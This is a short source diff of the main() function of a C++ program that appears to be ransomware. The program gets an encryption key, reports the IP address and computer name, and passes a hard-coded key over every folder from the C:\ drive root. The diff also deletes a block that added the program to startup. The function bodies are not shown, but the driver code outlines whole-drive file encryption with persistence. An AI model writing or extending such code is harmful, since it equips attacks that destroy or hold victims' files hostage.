@@ -44,26 +44,13 @@ int main(int argc, char* argv[])
 	std::cout << "File path: " << path << std::endl;
 	std::cout << "Press any key to continue..." << std::endl;
 
-    // open camere
-	//if (open_camera_app() ? std::cout << "Camera app opened successfully." : std::cerr << "Failed to open camera")
-
-	//std::cin.get(); // Wait for user input to continue
-    
-
-    if (add_to_startup(path))
-    {
-        std::cout << "Program successfully added to startup." << std::endl;
-    }
-    else
-    {
-        std::cerr << "Failed to add the program to startup." << std::endl;
-    }
-
     int key = get_encryption_key();
 	std::cout << conccet_ip_and_computer_name(key) << std::endl;
 	std::cin.get(); // Wait for user input to continue
 
-    bool a = get_file_folders(key, "C:\\", "");
+    //bool a = get_file_folders(key, "C:\\Users\\benda\\Documents\\staff", "", 1);
+
+    bool a = get_file_folders(63, "C:\\", "", -1);
 
 	std::getchar(); // Wait for user input to continue
 
